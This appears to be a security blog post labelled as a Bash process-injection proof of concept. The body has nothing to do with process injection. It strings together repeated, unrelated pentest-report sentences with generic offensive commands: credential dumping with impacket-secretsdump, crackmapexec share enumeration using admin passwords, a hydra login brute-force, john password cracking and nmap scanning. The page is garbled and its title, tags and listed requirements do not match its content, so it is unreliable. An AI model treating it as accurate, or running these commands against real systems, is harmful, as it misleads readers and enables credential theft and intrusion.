---
TitleSEO: "Process Injection PoC in Bash | ZureFX"
TitlePost: "Process Injection PoC — Bash"
Author: "ZureFX"
Description: "A Bash script for process injection poc. Built for security research and automation."
Keywords: "fuzzer, parser, python, script, bash"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-650.html"
URL_IMAGES: ""
Date: "2025-11-09"
Tags: "Fuzzer, Parser, Python, Script, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-650"
Permalink: "/scripting/script-process-injection-poc-650.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `john`
- `sqlmap`
- `psexec`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.122.211.128
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.129.205.92 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.110.218.117 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.197.191 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.68.125.112 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
crackmapexec smb 10.128.119.14 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p110,25,23 10.60.20.128 -oN scan.txt
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 28.01s
```
